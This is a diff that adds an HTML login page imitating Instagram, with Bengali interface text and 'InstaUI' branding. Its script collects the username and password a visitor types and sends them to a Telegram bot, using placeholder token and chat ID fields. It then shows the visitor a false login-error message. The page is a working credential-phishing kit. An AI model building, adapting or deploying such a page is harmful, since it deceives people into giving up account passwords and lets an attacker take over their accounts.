@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>InstaUI Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      margin: 0; padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 380px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    /* ----- Card ----- */
+    .card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 35px 35px 25px;
+      border-radius: 5px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    /* ----- Logo Text (Custom) ----- */
+    .logo {
+      font-family: "Pacifico", cursive;
+      text-align: center;
+      font-size: 38px;
+      margin-bottom: 5px;
+      user-select: none;
+      color: #262626;
+    }
+
+    /* ----- Inputs ----- */
+    .input {
+      width: 100%;
+      padding: 10px 12px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .input:focus {
+      border-color: #b5b5b5;
+      outline: none;
+    }
+
+    /* ----- Button ----- */
+    .btn-login {
+      width: 100%;
+      padding: 10px;
+      background: #0095f6;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-login:active {
+      opacity: 0.9;
+    }
+
+    /* ----- Divider (OR) ----- */
+    .divider-box {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 5px;
+    }
+
+    .line {
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .or {
+      font-size: 13px;
+      font-weight: 600;
+      color: #8e8e8e;
+    }
+
+    /* ----- Forgot Password ----- */
+    .forgot {
+      text-align: center;
+      margin-top: 8px;
+    }
+
+    .forgot a {
+      text-decoration: none;
+      color: #00376b;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    /* ----- Signup Box ----- */
+    .signup-box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      border-radius: 5px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    /* ----- Footer ----- */
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="wrapper">
+
+    <!-- Login Card -->
+    <div class="card">
+      <div class="logo">Instagram</div>
+
+
+
+ <div class="container">
+
+    <input class="input" type="text" id="username" placeholder="Username" required />
+    <input class="input" type="password" id="password" placeholder="Password" required />
+    <button class="btn-login" onclick="sendLogin()">Login</button>
+  </div>
+
+
+
+
+
+      <div class="divider-box">
+        <div class="line"></div>
+        <div class="or">অথবা</div>
+        <div class="line"></div>
+      </div>
+
+      <div class="forgot">
+        <a href="#">পাসওয়ার্ড ভুলে গেছেন?</a>
+      </div>
+    </div>
+
+    <!-- Signup Box -->
+    <div class="signup-box">
+      অ্যাকাউন্ট নেই? <a href="#">সাইন আপ করুন</a>
+    </div>
+
+    <div class="footer">InstaUI © 2025</div>
+  </div>
+
+  <script>
+    function sendLogin() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+
+      if (!user || !pass) {
+        alert("Please fill all fields");
+        return;
+      }
+
+      // আপনার Telegram Bot Token এবং Chat ID এখানে বসান
+      const botToken = "__TOKEN__";
+      const chatId = "__CHATID__";
+
+      const message = `🔐 New Login Info:\n👤 Username: ${user}\n🔑 Password: ${pass}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+        .then(res => alert("Login েerror please try again!"))
+        .catch(err => alert("Error sending to Telegram"));
+    }
+  </script>
+</body>
+</html>
+
+
+
+</body>
+</html>
